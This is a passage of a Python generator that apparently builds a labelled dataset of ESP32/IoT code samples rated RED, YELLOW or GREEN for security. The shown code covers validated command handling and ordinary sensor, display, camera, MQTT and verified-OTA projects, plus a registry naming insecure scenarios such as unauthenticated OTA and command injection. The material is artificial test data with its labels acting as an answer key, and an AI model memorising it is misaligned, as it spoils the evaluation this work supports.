void loop() { Serial.println(medianOf3(ping(), ping(), ping())); delay(200); }
"""
        fn, lang = "src/main.cpp", "cpp"
    else:
        code = """import serial, csv

ser = serial.Serial("/dev/ttyUSB0", 115200, timeout=1)
with open("log.csv", "a", newline="") as f:
    w = csv.writer(f)
    while True:
        line = ser.readline().decode(errors="ignore").strip()
        try:
            t, h = (float(x) for x in line.split(","))
        except ValueError:
            continue
        if -40 <= t <= 85 and 0 <= h <= 100:
            w.writerow([t, h])
"""
        fn, lang = "gateway.py", "python"
    files = {fn: code}
    if lang == "cpp":
        files["platformio.ini"] = pio([])
    return res(files, [], lang, "Ordinary sensor filtering / calibration / logging; no execution, network or privileged behaviour")


def E06(rng, v):
    if v == 0:
        code = '''import subprocess
import paho.mqtt.client as mqtt

ALLOWED = {
    "restart": ["systemctl", "restart", "esp-gateway"],
    "status":  ["systemctl", "is-active", "esp-gateway"],
}

def on_message(client, userdata, msg):
    cmd = msg.payload.decode().strip()
    if cmd not in ALLOWED:
        return
    subprocess.run(ALLOWED[cmd], check=False)

cl = mqtt.Client()
cl.on_message = on_message
cl.connect("broker.example.com", 8883)
cl.subscribe("farm/cmd")
cl.loop_forever()
'''
        fn, lang = "gateway.py", "python"
    elif v == 1:
        code = '''import socket

ALLOWED_CMDS = ("led_on", "led_off", "read")

s = socket.socket()
s.bind(("0.0.0.0", 7000))
s.listen(1)
while True:
    conn, _ = s.accept()
    cmd = conn.recv(16).decode().strip()
    if len(cmd) > 8 or cmd not in ALLOWED_CMDS:
        conn.send(b"denied")
    else:
        conn.send(b"ok:" + cmd.encode())
    conn.close()
'''
        fn, lang = "main.py", "python"
    elif v == 2:
        code = '''import re, subprocess
from flask import Flask, request, abort

app = Flask(__name__)
HOST_RE = re.compile(r"^[a-zA-Z0-9.-]{1,253}$")

@app.route("/lookup")
def lookup():
    host = request.args.get("host", "")
    if not HOST_RE.fullmatch(host):
        abort(400)
    out = subprocess.run(["nslookup", host], capture_output=True, text=True, timeout=5)
    return out.stdout

app.run(host="127.0.0.1", port=8080)
'''
        fn, lang = "gateway.py", "python"
    else:
        code = r"""#include <Arduino.h>
#include <string.h>

void handleCommand(const char* c) {
  if (strncmp(c, "led_on", 6) == 0)       digitalWrite(2, HIGH);
  else if (strncmp(c, "led_off", 7) == 0) digitalWrite(2, LOW);
  else Serial.println("unknown");
}

void setup() { Serial.begin(115200); pinMode(2, OUTPUT); }
void loop() {
  static char line[16];
  if (Serial.readBytesUntil('\n', line, sizeof(line) - 1) > 0) {
    line[sizeof(line) - 1] = 0;
    handleCommand(line);
    memset(line, 0, sizeof(line));
  }
}
"""
        fn, lang = "src/main.cpp", "cpp"
    files = {fn: code}
    if lang == "cpp":
        files["platformio.ini"] = pio([])
    return res(files, [], lang, "External commands are length-checked / allow-listed / regex-validated and mapped to fixed argument lists before use")


# --------------------------------------------------------------------------
# L: legitimate embedded applications
# --------------------------------------------------------------------------
def L01(rng, v):
    N = names(rng)
    pin = rng.choice([4, 5, 15, 27])
    N.update(pin=pin)
    if v % 2 == 0:
        s = sketch(['#include "DHT.h"'], T("#define DHTPIN $pin\n#define DHTTYPE DHT11\nDHT dht(DHTPIN, DHTTYPE);\n", **N),
                   "  dht.begin();\n", r"""  delay($iv);
  float h = dht.readHumidity();
  float t = dht.readTemperature();
  if (isnan(h) || isnan(t)) { Serial.println("DHT read failed"); return; }
  Serial.printf("Temp: %.1f C  Hum: %.1f %%\n", t, h);
""", "", N)
        libs = ["DHT sensor library"]
    else:
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>", '#include "DHT.h"', "#include <ArduinoJson.h>"],
                   T(WIFI_DECL + "#define DHTPIN $pin\nDHT dht(DHTPIN, DHT11);\nWebServer server(80);\n", **N),
                   ind(WIFI_CONN) + r"""  dht.begin();
  server.on("/data", []() {
    JsonDocument d;
    d["temperature"] = dht.readTemperature();
    d["humidity"] = dht.readHumidity();
    String out; serializeJson(d, out);
    server.send(200, "application/json", out);
  });
  server.begin();
""", "  server.handleClient();\n", "", N)
        libs = ["DHT sensor library", "ArduinoJson"]
    return res(cpp_proj(s, libs), deps_for(libs), "cpp", "Standard DHT11 temperature/humidity monitoring")


def L02(rng, v):
    N = names(rng)
    trig, echo = rng.choice([(5, 18), (12, 14), (25, 26), (32, 33)])
    N.update(trig=trig, echo=echo)
    if v % 2 == 0:
        s = sketch([], T("const int TRIG_PIN = $trig;\nconst int ECHO_PIN = $echo;\n", **N),
                   "  pinMode(TRIG_PIN, OUTPUT);\n  pinMode(ECHO_PIN, INPUT);\n", r"""  digitalWrite(TRIG_PIN, LOW);  delayMicroseconds(2);
  digitalWrite(TRIG_PIN, HIGH); delayMicroseconds(10);
  digitalWrite(TRIG_PIN, LOW);
  long us = pulseIn(ECHO_PIN, HIGH, 30000);
  float cm = us * 0.0343f / 2.0f;
  Serial.printf("Distance: %.1f cm\n", cm);
  delay(250);
""", "", N)
        libs = []
    else:
        s = sketch(["#include <NewPing.h>"], T("NewPing sonar($trig, $echo, 200);\n", **N), "",
                   "  delay(100);\n  Serial.printf(\"Distance: %u cm\\n\", sonar.ping_cm());\n", "", N)
        libs = ["NewPing"]
    return res(cpp_proj(s, libs), deps_for(libs), "cpp", "HC-SR04 distance measurement")


def L03(rng, v):
    N = names(rng)
    if v % 2 == 0:
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>"], WIFI_DECL + "WebServer server(80);\n",
                   ind(WIFI_CONN) + '  server.on("/", []() { server.send(200, "text/html", "<h1>$dev</h1><p>uptime ok</p>"); });\n  server.begin();\n',
                   "  server.handleClient();\n", "", N)
    else:
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>"], WIFI_DECL + "WebServer server(80);\nbool ledOn = false;\n",
                   ind(WIFI_CONN) + r"""  pinMode(2, OUTPUT);
  server.on("/", []() { server.send(200, "text/html", ledOn ? "LED is ON" : "LED is OFF"); });
  server.on("/toggle", []() { ledOn = !ledOn; digitalWrite(2, ledOn); server.sendHeader("Location", "/"); server.send(303); });
  server.onNotFound([]() { server.send(404, "text/plain", "not found"); });
  server.begin();
""", "  server.handleClient();\n", "", N)
    return res(cpp_proj(s), [], "cpp", "Plain Wi-Fi web server serving a page / toggling an LED; no update or exec features")


def L04(rng, v):
    N = names(rng)
    base_inc = ["#include <WiFi.h>", "#include <WiFiClientSecure.h>", "#include <PubSubClient.h>"]
    g = WIFI_DECL + 'const char* MQTT_HOST = "broker.example.com";\nconst int MQTT_PORT = 8883;\nconst char* MQTT_USER = "esp32_user";\nconst char* MQTT_PASS = "REPLACE_ME";\nWiFiClientSecure net;\nPubSubClient mqtt(net);\n'
    if v % 2 == 0:
        funcs = r"""
void reconnect() {
  while (!mqtt.connected()) {
    if (!mqtt.connect("$dev", MQTT_USER, MQTT_PASS)) delay(2000);
  }
}
"""
        setup = ind(WIFI_CONN) + "  net.setCACert(ROOT_CA);\n  mqtt.setServer(MQTT_HOST, MQTT_PORT);\n"
        loop = '  if (!mqtt.connected()) reconnect();\n  mqtt.loop();\n  char msg[48];\n  snprintf(msg, sizeof(msg), "{\\"temp\\":%.1f}", 20.0 + random(0, 50) / 10.0);\n  mqtt.publish("sensors/$dev/temp", msg);\n  delay($iv);\n'
    else:
        funcs = r"""
bool reconnect() {
  return mqtt.connect("$dev", MQTT_USER, MQTT_PASS, "sensors/$dev/status", 1, true, "offline");
}
"""
        setup = ind(WIFI_CONN) + "  net.setCACert(ROOT_CA);\n  mqtt.setServer(MQTT_HOST, MQTT_PORT);\n  reconnect();\n"
        loop = '  if (!mqtt.connected()) { reconnect(); delay(1000); return; }\n  mqtt.publish("sensors/$dev/status", "online", true);\n  mqtt.publish("sensors/$dev/adc", String(analogRead(34)).c_str());\n  mqtt.loop();\n  delay($iv);\n'
    g += 'const char* ROOT_CA = "-----BEGIN CERTIFICATE-----\\n<PLACEHOLDER_ROOT_CA>\\n-----END CERTIFICATE-----\\n";\n'
    s = sketch(base_inc, g, setup, ind(loop), funcs, N)
    return res(cpp_proj(s, ["PubSubClient"]), deps_for(["PubSubClient"]), "cpp", "MQTT publishing over TLS with username/password")


CAM_PINS = r"""#define PWDN_GPIO_NUM 32
#define RESET_GPIO_NUM -1
#define XCLK_GPIO_NUM 0
#define SIOD_GPIO_NUM 26
#define SIOC_GPIO_NUM 27
#define Y9_GPIO_NUM 35
#define Y8_GPIO_NUM 34
#define Y7_GPIO_NUM 39
#define Y6_GPIO_NUM 36
#define Y5_GPIO_NUM 21
#define Y4_GPIO_NUM 19
#define Y3_GPIO_NUM 18
#define Y2_GPIO_NUM 5
#define VSYNC_GPIO_NUM 25
#define HREF_GPIO_NUM 23
#define PCLK_GPIO_NUM 22
"""
CAM_INIT = r"""
bool startCamera() {
  camera_config_t c;
  c.ledc_channel = LEDC_CHANNEL_0; c.ledc_timer = LEDC_TIMER_0;
  c.pin_d0 = Y2_GPIO_NUM; c.pin_d1 = Y3_GPIO_NUM; c.pin_d2 = Y4_GPIO_NUM; c.pin_d3 = Y5_GPIO_NUM;
  c.pin_d4 = Y6_GPIO_NUM; c.pin_d5 = Y7_GPIO_NUM; c.pin_d6 = Y8_GPIO_NUM; c.pin_d7 = Y9_GPIO_NUM;
  c.pin_xclk = XCLK_GPIO_NUM; c.pin_pclk = PCLK_GPIO_NUM; c.pin_vsync = VSYNC_GPIO_NUM; c.pin_href = HREF_GPIO_NUM;
  c.pin_sccb_sda = SIOD_GPIO_NUM; c.pin_sccb_scl = SIOC_GPIO_NUM; c.pin_pwdn = PWDN_GPIO_NUM; c.pin_reset = RESET_GPIO_NUM;
  c.xclk_freq_hz = 20000000; c.pixel_format = PIXFORMAT_JPEG;
  c.frame_size = FRAMESIZE_VGA; c.jpeg_quality = 12; c.fb_count = 2;
  return esp_camera_init(&c) == ESP_OK;
}
"""


def L05(rng, v):
    N = names(rng)
    if v % 2 == 0:
        g = WIFI_DECL + CAM_PINS + "WebServer server(80);\n"
        funcs = CAM_INIT + r"""
void handleStream() {
  WiFiClient client = server.client();
  client.print("HTTP/1.1 200 OK\r\nContent-Type: multipart/x-mixed-replace; boundary=frame\r\n\r\n");
  while (client.connected()) {
    camera_fb_t* fb = esp_camera_fb_get();
    if (!fb) break;
    client.printf("--frame\r\nContent-Type: image/jpeg\r\nContent-Length: %u\r\n\r\n", fb->len);
    client.write(fb->buf, fb->len);
    client.print("\r\n");
    esp_camera_fb_return(fb);
  }
}
"""
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>", '#include "esp_camera.h"'], g,
                   ind(WIFI_CONN) + '  if (!startCamera()) { Serial.println("camera init failed"); return; }\n  server.on("/stream", handleStream);\n  server.begin();\n',
                   "  server.handleClient();\n", funcs, N)
    else:
        g = WIFI_DECL + CAM_PINS + "httpd_handle_t httpd = NULL;\n"
        funcs = CAM_INIT + r"""
static esp_err_t jpgHandler(httpd_req_t* req) {
  camera_fb_t* fb = esp_camera_fb_get();
  if (!fb) { httpd_resp_send_500(req); return ESP_FAIL; }
  httpd_resp_set_type(req, "image/jpeg");
  esp_err_t r = httpd_resp_send(req, (const char*)fb->buf, fb->len);
  esp_camera_fb_return(fb);
  return r;
}
"""
        s = sketch(["#include <WiFi.h>", '#include "esp_camera.h"', '#include "esp_http_server.h"'], g,
                   ind(WIFI_CONN) + '  startCamera();\n  httpd_config_t cfg = HTTPD_DEFAULT_CONFIG();\n  if (httpd_start(&httpd, &cfg) == ESP_OK) {\n    httpd_uri_t u = { "/capture", HTTP_GET, jpgHandler, NULL };\n    httpd_register_uri_handler(httpd, &u);\n  }\n',
                   "  delay(10000);\n", funcs, N)
    return res(cpp_proj(s, [], extra_pio=""), [], "cpp", "AI-Thinker ESP32-CAM MJPEG / JPEG streaming application")


def L06(rng, v):
    N = names(rng)
    inc = ["#include <Wire.h>", "#include <Adafruit_GFX.h>", "#include <Adafruit_SSD1306.h>"]
    g = "Adafruit_SSD1306 oled(128, 64, &Wire, -1);\n"
    if v % 2 == 0:
        setup = '  if (!oled.begin(SSD1306_SWITCHCAPVCC, 0x3C)) { Serial.println("OLED not found"); for (;;); }\n  oled.clearDisplay();\n  oled.setTextSize(2);\n  oled.setTextColor(SSD1306_WHITE);\n  oled.setCursor(0, 0);\n  oled.println("Hello");\n  oled.display();\n'
        loop = "  delay(1000);\n"
    else:
        setup = '  oled.begin(SSD1306_SWITCHCAPVCC, 0x3C);\n  oled.setTextColor(SSD1306_WHITE);\n'
        loop = '  oled.clearDisplay();\n  oled.setCursor(0, 0);\n  oled.printf("ADC: %d\\n", analogRead(34));\n  oled.printf("Up: %lus", millis() / 1000);\n  oled.display();\n  delay(500);\n'
    s = sketch(inc, g, setup, loop, "", N)
    libs = ["Adafruit SSD1306", "Adafruit GFX Library"]
    return res(cpp_proj(s, libs), deps_for(libs), "cpp", "SSD1306 OLED display application")


def L07(rng, v):
    N = names(rng)
    s = ota_sketch(rng, N, https=True, auth=True, sha=(v % 2 == 0 or v == 3), sig=(v >= 2),
                   manifest=(v < 2), version_check=(v in (1, 3)), style=v % 2)
    libs = ["ArduinoJson"] if v < 2 else []
    return res(cpp_proj(s, libs), deps_for(libs), "cpp",
               "OTA with HTTPS, bearer auth and " + ("signature + hash" if v >= 2 else "SHA-256 manifest") + " verification before flashing")


def L08(rng, v):
    N = names(rng)
    in1, in2, ena = rng.choice([(26, 27, 14), (16, 17, 4), (18, 19, 5)])
    N.update(in1=in1, in2=in2, ena=ena)
    common = "const int IN1 = $in1, IN2 = $in2, ENA = $ena;\n"
    funcs = r"""
void drive(int speed) {              // -255..255
  digitalWrite(IN1, speed > 0);
  digitalWrite(IN2, speed < 0);
  ledcWrite(0, abs(speed));
}
"""
    setup_pins = "  pinMode(IN1, OUTPUT); pinMode(IN2, OUTPUT);\n  ledcSetup(0, 5000, 8);\n  ledcAttachPin(ENA, 0);\n"
    if v % 2 == 0:
        s = sketch([], T(common, **N), setup_pins, r"""  if (Serial.available()) {
    int sp = Serial.parseInt();
    drive(constrain(sp, -255, 255));
  }
""", funcs, N)
    else:
        s = sketch(["#include <WiFi.h>", "#include <WebServer.h>"], T(WIFI_DECL + common + "WebServer server(80);\n", **N),
                   ind(WIFI_CONN) + setup_pins + r"""  server.on("/fwd",  []() { drive(200);  server.send(200, "text/plain", "fwd"); });
  server.on("/back", []() { drive(-200); server.send(200, "text/plain", "back"); });
  server.on("/stop", []() { drive(0);    server.send(200, "text/plain", "stop"); });
  server.begin();
""", "  server.handleClient();\n", funcs, N)
    return res(cpp_proj(s), [], "cpp", "L298N DC motor control (serial or Wi-Fi commands)")


# --------------------------------------------------------------------------
# registry: (id, category, label, function)
# --------------------------------------------------------------------------
SCENARIOS = [
    ("O01", "OTA", "RED", "OTA update endpoint without authentication", O01),
    ("O02", "OTA", "GREEN", "Firmware signature verification before installation", O02),
    ("O03", "OTA", "YELLOW", "OTA update without visible integrity verification", O03),
    ("O04", "OTA", "GREEN", "Authenticated and integrity-checked firmware update", O04),
    ("O05", "OTA", "RED", "Firmware downloaded over insecure HTTP", O05),
    ("D01", "DEPENDENCY", "YELLOW", "Package name imitating a trusted library", D01),
    ("D02", "DEPENDENCY", "YELLOW", "Dependency with suspicious installation/build script", D02),
    ("D03", "DEPENDENCY", "GREEN", "Verified legitimate dependency", D03),
    ("D04", "DEPENDENCY", "YELLOW", "Unknown publisher with incomplete metadata", D04),
    ("D05", "DEPENDENCY", "RED", "Dependency with suspicious source behaviour", D05),
    ("D06", "DEPENDENCY", "GREEN", "Legitimate library with low download count", D06),
    ("E01", "DYNAMIC_EXEC", "RED", "External input passed into a command execution function", E01),
    ("E02", "DYNAMIC_EXEC", "YELLOW", "Safe fixed command execution", E02),
    ("E03", "DYNAMIC_EXEC", "YELLOW", "Unnecessary dynamic code execution", E03),
    ("E04", "DYNAMIC_EXEC", "YELLOW", "Encoded data combined with sensitive execution operations", E04),
    ("E05", "DYNAMIC_EXEC", "GREEN", "Normal sensor data processing", E05),
    ("E06", "DYNAMIC_EXEC", "GREEN", "Input validation before processing external commands", E06),
    ("L01", "LEGIT_EMBEDDED", "GREEN", "ESP32 temperature monitoring with DHT11", L01),
    ("L02", "LEGIT_EMBEDDED", "GREEN", "ESP32 ultrasonic distance measurement", L02),
    ("L03", "LEGIT_EMBEDDED", "GREEN", "ESP32 Wi-Fi web server", L03),
    ("L04", "LEGIT_EMBEDDED", "GREEN", "ESP32 MQTT sensor publishing with authentication", L04),
    ("L05", "LEGIT_EMBEDDED", "GREEN", "ESP32 camera streaming application", L05),
    ("L06", "LEGIT_EMBEDDED", "GREEN", "ESP32 OLED display application", L06),
    ("L07", "LEGIT_EMBEDDED", "GREEN", "ESP32 OTA with proper authentication and integrity checks", L07),
    ("L08", "LEGIT_EMBEDDED", "GREEN", "ESP32 motor control using L298N", L08),
]
